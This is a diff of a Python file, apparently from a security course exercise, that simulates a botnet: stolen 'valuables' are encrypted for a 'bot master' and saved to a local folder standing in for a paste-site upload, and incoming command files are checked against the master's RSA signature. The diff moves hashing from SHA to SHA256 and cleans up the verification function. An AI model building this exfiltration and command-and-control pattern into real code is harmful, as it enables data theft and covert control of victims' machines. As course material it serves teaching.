@@ -2,7 +2,7 @@ import os
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_v1_5
 from Crypto.Signature import PKCS1_PSS
-from Crypto.Hash import SHA
+from Crypto.Hash import SHA256
 
 # Instead of storing files on disk,
 # we'll save them in memory for simplicity
@@ -18,7 +18,7 @@ def save_valuable(data):
 
 def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
-    hashed_data = SHA.new(data);
+    hashed_data = SHA256.new(data);
 
     pkcs_cipher = PKCS1_v1_5.new(masters_public_key);
     return pkcs_cipher.encrypt(data) + hashed_data.digest();
@@ -27,7 +27,6 @@ def upload_valuables_to_pastebot(fn):
     # Encrypt the valuables so only the bot master can read them
     valuable_data = "\n".join(valuables)
     valuable_data = bytes(valuable_data, "ascii")
-    # encrypted_master is a "tuple" data structure, the first section is what we want
     encrypted_master = encrypt_for_master(valuable_data)
 
     # "Upload" it to pastebot (i.e. save in pastebot folder)
@@ -43,24 +42,14 @@ def verify_file(f):
     # Verify the file was sent by the bot master
     # TODO: For Part 2, you'll use public key crypto here
     # Naive verification by ensuring the first line has the "passkey"
-    #lines = f.split(bytes("\n", "ascii"), 1)
-    #first_line = lines[0];
     message = f[256:]
     master_signature = f[:256]
-    
-    #hash = SHA.new(lines[1]);
-    hash = SHA.new(message)
-    #verifier = PKCS1_PSS.new(masters_public_key);
-    verifier = PKCS1_PSS.new(masters_public_key);
-    verified = verifier.verify(hash, master_signature)
-    #is_sent_from_master = verifier.verify(hash, first_line);
 
-    #if (is_sent_from_master):
-    if (verified):
-        print("This Signature is authentic.");
-    else:
-        print("The Signature is not authentic");
-    #return is_sent_from_master;
+    hash = SHA256.new(message)
+    verifier = PKCS1_PSS.new(masters_public_key);
+    is_valid = verifier.verify(hash, master_signature);
+
+    return is_valid;
 
 def process_file(fn, f):
     if verify_file(f):
